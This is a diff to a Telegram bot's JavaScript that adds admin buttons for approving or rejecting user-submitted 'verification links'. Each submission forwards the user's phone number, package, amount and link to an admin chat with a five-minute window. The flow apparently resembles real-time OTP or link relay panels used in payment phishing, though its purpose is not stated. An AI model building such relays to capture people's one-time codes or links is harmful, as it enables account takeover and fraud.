@@ -197,6 +197,48 @@ if (botEnabled && bot) {
             await bot.answerCallbackQuery(query.id, { text: '⚠️ Invalid info requested' });
 
             if (request.onInvalid) request.onInvalid(requestId);
+        } else if (action === 'link_approve') {
+            request.status = 'completed';
+            delete request.verificationStep;
+
+            const text = `✅ Link Verified - Payment Complete!\n\n` +
+                `📱 Phone: ${request.userPhone}\n` +
+                `📦 Package: ${request.package}\n` +
+                `💰 Amount: ${request.amount}\n` +
+                `💳 Method: ${request.method}\n\n` +
+                `The verification link has been approved and payment is complete.`;
+
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: query.message.message_id
+            });
+
+            await bot.answerCallbackQuery(query.id, { text: '✅ Link verified - payment complete' });
+
+            if (request.onVerified) request.onVerified(requestId);
+
+            setTimeout(() => approvals.delete(requestId), 30000);
+
+        } else if (action === 'link_invalid') {
+            request.status = 'invalid';
+            request.verificationStep = null;
+
+            const text = `❌ Invalid Link\n\n` +
+                `📱 Phone: ${request.userPhone}\n` +
+                `📦 Package: ${request.package}\n` +
+                `💰 Amount: ${request.amount}\n\n` +
+                `The verification link was incorrect. The user has been notified.`;
+
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: query.message.message_id
+            });
+
+            await bot.answerCallbackQuery(query.id, { text: '❌ Invalid link' });
+
+            if (request.onInvalid) request.onInvalid(requestId);
+
+            setTimeout(() => approvals.delete(requestId), 30000);
         }
     });
 
@@ -351,12 +393,18 @@ function submitLink(requestId, link) {
     request.status = 'otp_pending';
 
     if (botEnabled && bot) {
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
+                 { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }]
+            ]
+        };
         bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
             `📱 Phone: ${request.userPhone}\n` +
             `📦 Package: ${request.package}\n` +
             `🔗 Link: ${link}\n\n` +
             `Please verify by clicking "Verify Link" and confirming.\n` +
-            `⏱️ You have 5 minutes.`).then((msg) => {
+            `⏱️ You have 5 minutes.`, { reply_markup: keyboard }).then((msg) => {
             request.adminOtpMessageId = msg.message_id;
         }).catch((err) => {
             console.error('Failed to send link notification:', err.message);
